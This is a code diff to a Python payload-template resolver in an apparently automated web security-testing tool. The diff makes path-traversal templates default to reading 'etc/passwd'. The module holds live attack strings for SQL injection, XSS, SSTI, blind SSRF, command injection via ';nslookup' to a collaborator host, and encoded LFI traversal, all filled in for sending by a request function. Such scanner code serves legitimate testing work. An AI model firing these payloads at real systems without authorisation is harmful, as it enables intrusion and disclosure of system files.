@@ -54,8 +54,13 @@ from __future__ import annotations
 from reachagent.payloads.library import PayloadEntry, PayloadLibraryError
 
 # Fixed slot vocabulary. A template's *required* slots are exactly the members of
-# this set that appear as ``{name}`` in it — so literal payload braces (which are
-# never one of these tokens) are left alone.
+# this set that appear as ``{name}`` in it (minus any with a default) — so literal
+# payload braces (which are never one of these tokens) are left alone.
+#
+# Slot semantics are single-purpose on purpose: a URL-valued slot and a
+# file-path-valued slot must never share a name, or a realistic kit that fills the
+# shared slot with (say) a URL yields a malformed value for the other class. Hence
+# ``file_target`` (path-traversal/LFI file target) is distinct from any URL slot.
 _SLOTS: frozenset[str] = frozenset(
     {
         "nonce",
@@ -66,11 +71,18 @@ _SLOTS: frozenset[str] = frozenset(
         "predicate",
         "pattern",
         "expr",
-        "target",
+        "file_target",
         "object_id",
         "priv_field",
     }
 )
+
+# Per-slot defaults: a referenced slot with a default is optional (the caller may
+# override it, else the default fills in). ``file_target`` defaults to a canonical
+# read-only traversal target so a path-traversal ref resolves with no kit.
+_SLOT_DEFAULTS: dict[str, str] = {
+    "file_target": "etc/passwd",
+}
 
 
 class UnknownPayloadRefError(PayloadLibraryError):
@@ -108,7 +120,7 @@ _TEMPLATES: dict[str, str] = {
     "patt/ssrf/blind/oob-fetch": "http://{nonce}.{collab}/",
     "patt/xss/reflected/img-onerror-canary": "<img src=x onerror={canary}>",
     "patt/xss/stored/svg-onload-canary": "<svg onload={canary}>",
-    "patt/path-traversal/dot-dot-slash": "../../../../{target}",
+    "patt/path-traversal/dot-dot-slash": "../../../../{file_target}",
     # -- SecLists (data/corpus/seclists.yaml) --------------------------------
     "seclists/fuzzing/sqli/generic-meta-strings": "' OR 1=1-- -",
     "seclists/fuzzing/sqli/time-based-vectors": "' AND SLEEP({sleep})-- -",
@@ -117,16 +129,26 @@ _TEMPLATES: dict[str, str] = {
     "seclists/fuzzing/command-injection/oob-separators": ";nslookup {nonce}.{collab}",
     "seclists/fuzzing/ssti/template-eval-expressions": "{{{expr}}}",
     "seclists/fuzzing/xss/canary-handlers": "<img src=x onerror={canary}>",
-    "seclists/fuzzing/lfi/encoded-traversal": "..%2f..%2f..%2f..%2f{target}",
+    "seclists/fuzzing/lfi/encoded-traversal": "..%2f..%2f..%2f..%2f{file_target}",
 }
 
 
+def _slots_in(template: str) -> frozenset[str]:
+    """Every vocabulary slot token appearing in ``template``."""
+    return frozenset(s for s in _SLOTS if "{" + s + "}" in template)
+
+
 def required_slots(payload_ref: str) -> frozenset[str]:
-    """The slot names a ``payload_ref``'s template needs filled (unknown ref → error)."""
+    """Slots the caller MUST supply for a ref (unknown ref → error).
+
+    A slot the template uses but which has a default (``_SLOT_DEFAULTS``) is
+    optional, so it is excluded here — e.g. ``file_target`` defaults to
+    ``etc/passwd``, so a path-traversal ref requires no slot at all.
+    """
     template = _TEMPLATES.get(payload_ref)
     if template is None:
         raise UnknownPayloadRefError(f"no template for payload_ref {payload_ref!r}")
-    return frozenset(s for s in _SLOTS if "{" + s + "}" in template)
+    return _slots_in(template) - _SLOT_DEFAULTS.keys()
 
 
 def known_refs() -> frozenset[str]:
@@ -137,9 +159,11 @@ def known_refs() -> frozenset[str]:
 def resolve(payload_ref: str, **slots: object) -> str:
     """Resolve ``payload_ref`` to a filled payload string ready for ``fire_request``.
 
-    Fills each required slot by targeted replacement (not ``str.format``, so literal
-    payload braces survive). Raises :class:`UnknownPayloadRefError` for a ref with
-    no template and :class:`MissingSlotError` for a required slot the caller omitted.
+    Fills each slot by targeted replacement (not ``str.format``, so literal payload
+    braces survive). A slot with a default (``_SLOT_DEFAULTS``) is optional — the
+    caller's value overrides it, otherwise the default fills in. Raises
+    :class:`UnknownPayloadRefError` for a ref with no template and
+    :class:`MissingSlotError` for a required (default-less) slot the caller omitted.
     Extra slots the template doesn't use are ignored, so a caller may pass a full
     context kit (nonce/canary/…) to every ref uniformly. Deterministic: pure
     substitution, same inputs → same output.
@@ -147,15 +171,17 @@ def resolve(payload_ref: str, **slots: object) -> str:
     template = _TEMPLATES.get(payload_ref)
     if template is None:
         raise UnknownPayloadRefError(f"no template for payload_ref {payload_ref!r}")
-    needed = frozenset(s for s in _SLOTS if "{" + s + "}" in template)
-    missing = needed - {k for k, v in slots.items() if v is not None}
+    used = _slots_in(template)
+    supplied = {k: v for k, v in slots.items() if v is not None}
+    missing = (used - _SLOT_DEFAULTS.keys()) - supplied.keys()
     if missing:
         raise MissingSlotError(
             f"payload_ref {payload_ref!r} needs slot(s) {sorted(missing)}; got {sorted(slots)}"
         )
     result = template
-    for name in needed:
-        result = result.replace("{" + name + "}", str(slots[name]))
+    for name in used:
+        value = supplied.get(name, _SLOT_DEFAULTS.get(name))
+        result = result.replace("{" + name + "}", str(value))
     return result
 
 
